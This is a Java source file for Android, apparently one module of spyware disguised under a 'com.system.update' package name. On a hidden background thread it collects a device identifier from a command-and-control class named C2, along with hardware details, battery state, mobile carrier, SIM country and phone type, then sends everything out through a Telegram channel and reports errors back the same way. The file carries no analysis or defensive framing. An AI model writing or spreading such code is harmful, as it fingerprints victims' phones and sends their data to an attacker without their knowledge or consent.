package com.system.update;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.TelephonyManager;

public final class DeviceExtras {
    private DeviceExtras() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("🔋 DEVICE id=").append(C2.getDeviceId()).append('\n');
                sb.append("board=").append(Build.BOARD).append(" hardware=").append(Build.HARDWARE).append('\n');
                sb.append("serial_api=").append(Build.VERSION.SDK_INT).append('\n');
                try {
                    Intent bat = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                    if (bat != null) {
                        int lvl = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                        int scl = bat.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                        int st = bat.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                        sb.append("battery=").append(lvl * 100 / Math.max(scl, 1)).append("% status=").append(st).append('\n');
                    }
                } catch (Throwable ignored) {}
                try {
                    TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        sb.append("operator=").append(tm.getNetworkOperatorName()).append('\n');
                        sb.append("sim_country=").append(tm.getSimCountryIso()).append('\n');
                        sb.append("phone_type=").append(tm.getPhoneType()).append('\n');
                    }
                } catch (Throwable ignored) {}
                Telegram.send(sb.toString());
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "dev_err:" + t.getMessage());
            }
        }, "dev-x").start();
    }
}
